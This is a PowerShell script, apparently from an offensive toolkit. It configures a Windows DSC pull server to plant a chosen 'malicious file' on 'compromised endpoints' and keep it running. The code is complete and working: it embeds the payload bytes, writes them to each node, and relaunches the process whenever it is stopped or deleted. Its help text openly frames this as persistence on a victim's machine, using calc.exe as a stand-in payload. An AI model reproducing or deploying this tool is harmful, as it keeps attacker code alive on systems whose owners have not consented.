function Configure-Payload
{
<#
.SYNOPSIS

Configure DSC pull server for file and process persistence 

.DESCRIPTION

Script ensures a file is present and running on a compromised endpoint.

Must be run on the DSC server before configuring any endpoints.

Malicious file must be present server side at time of initial configuration.

.PARAMETER SourceFile

Local path to the malicious file that will persistent on compromised endpoints. 

.PARAMETER DestinationPath

Location on compromised endpoints where the contents of 'SourceFile' should be written on compromomised endpoints.  

.PARAMETER Arguments

Optionally specifies command line arguments provided to during execution.

.EXAMPLE


PS C:\> Configure-Payload -SourceFile C:\Windows\System32\calc.exe -DestinationPath C:\calc.exe

Description
-----------
Server Side:
Obtains contents of C:\Windows\System32\calc.exe and creates a new DSC configuration

Victime Side:
Creates file C:\calc.exe with contents of C:\Windows\System32\calc.exe and ensures file is running
If file is deleted or process is stopped script will recreate file and/or relaunch process

.EXAMPLE


PS C:\> Configure-Payload -SourceFile C:\Windows\System32\calc.exe -DestinationPath C:\calc.exe -Arguments "foo bar"

Description
-----------
Creates file C:\calc.exe with contents of C:\Windows\System32\calc.exe and ensures file is running with parameters provided in Arguments variable


#>
    
    [CmdletBinding()] Param(
        [Parameter(Mandatory = $True)]
        [String] $SourceFile,

        [Parameter(Mandatory = $True)]
        [String] $DestinationPath,

        [Parameter(Mandatory = $False)]
        [String] $Arguments 

    )
    
    $FileBytes = [System.IO.File]::ReadAllBytes($SourceFile)
    $GUID = [guid]::NewGuid()
    
    Write-Host "GUID for Config:" $GUID

    
    Configuration SetupPullConfig {
        Param(
        [Parameter(Mandatory = $True)]
        [String[]] $NodeGUID

        )
        Node $NodeGUID { 
            Script Ensure-File {
                SetScript = $([string]{
                    $bytes = [byte[]]($FileBytes).split(' ')
                    [System.IO.File]::WriteAllBytes($DestinationPath, $bytes)
                }).Replace('$FileBytes', "'$FileBytes'").Replace('$DestinationPath', "'$DestinationPath'")
                
                TestScript = $([string]{
                    Test-Path $DestinationPath
                }).Replace('$DestinationPath', "'$DestinationPath'")

                GetScript = {
                    return @{
                        GetScript = $GetScript
                        SetScript = $SetScript
                        TestScript = $TestScript
                    }
                }
            }
            Script Ensure-Process {
                SetScript = $([string]{
                    Start-Process $DestinationPath $Arguments
                }).Replace('$DestinationPath', "'$DestinationPath'").Replace('$Arguments', "'$Arguments'")
                TestScript = $([string]{
                   (get-process).path -contains $DestinationPath
                }).Replace('$DestinationPath', "'$DestinationPath'")
                    
                GetScript = {
                    return @{
                        GetScript = $GetScript
                        SetScript = $SetScript
                        TestScript = $TestScript
                    }
                }
            }        
         
        }
    }

    SetupPullConfig -NodeGUID $GUID -OutputPath "$env:SystemDrive\Program Files\WindowsPowershell\DscService\Configuration"
    
    Write-Host "Generating Checksum"
    New-DscChecksum -ConfigurationPath "$env:SystemDrive\Program Files\WindowsPowershell\DscService\Configuration\" -OutPath "$env:SystemDrive\Program Files\WindowsPowershell\DscService\Configuration"

}                       
